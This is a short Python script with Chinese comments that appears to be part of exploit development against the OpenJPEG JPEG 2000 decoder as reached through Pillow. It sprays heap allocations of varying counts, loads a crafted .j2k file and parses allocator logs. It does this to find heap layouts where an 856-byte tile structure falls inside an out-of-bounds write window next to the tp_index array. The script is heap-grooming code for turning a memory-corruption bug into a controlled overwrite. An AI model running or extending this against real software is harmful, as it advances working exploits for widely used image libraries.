#!/usr/bin/env python3
# 小步扫描：不同的"预留量 K"下，opj_tcd_tile_t(856) 相对 tp_index 的地址偏移
#   目标：找到使 delta 落在 (0, 0x1A30) 的堆状态 => 856 结构体落进写窗口
import gc, os, re, sys

TARGET = '/tmp/GR23.j2k'
KS = [0, 512]


def run_once(k):
    LOG = '/tmp/k%d.log' % k
    pid = os.fork()
    if pid == 0:
        fd = os.open(LOG, os.O_WRONLY | os.O_CREAT | os.O_TRUNC)
        os.dup2(fd, 2)
        keep = [bytes(544) for _ in range(k)]        # 0x230 档
        from PIL import Image
        try:
            im = Image.open(TARGET)
            im.load()
        except BaseException as e:
            os.write(1, ("ERR %r\n" % (e,)).encode())
        os._exit(0)
    os.waitpid(pid, 0)
    log = open(LOG, errors='ignore').read()
    arr = None
    t856 = []
    heads = []
    for ln in log.splitlines():
        m = re.search(r'calloc\] n=23 s=24 -> (0x[0-9a-f]+)', ln)
        if m:
            arr = int(m.group(1), 16)
        m = re.search(r'calloc\] n=1 s=856 -> (0x[0-9a-f]+)', ln)
        if m:
            t856.append(int(m.group(1), 16))
        m = re.search(r'calloc\] n=1 s=(\d+) -> (0x[0-9a-f]+)', ln)
        if m and arr and m.group(1) in ('24','104','112','48','56','88','16'):
            heads.append((int(m.group(1)), int(m.group(2), 16)))
    return arr, t856, heads


print("%-6s %-10s %-10s %s" % ("K", "arr", "856", "delta(856-arr) + 32B级邻居"))
for k in KS:
    arr, t856, heads = run_once(k)
    if not arr or not t856:
        print("%-6d %s" % (k, "无数据"))
        continue
    ds = [a - arr for a in t856]
    nb = [d for (sz, a) in heads if 0 < (d := a - arr) < 0x1800]
    flag = "★" if any(0 < d < 0x1800 for d in ds) else ""
    print("%-6d %-10s %-10s %s"
          % (k, hex(arr), hex(t856[0]), [hex(d) for d in ds]))
    print('       邻居(尺寸->delta):', [(sz, hex(a-arr)) for sz,a in heads if 0 < a-arr < 0x1800])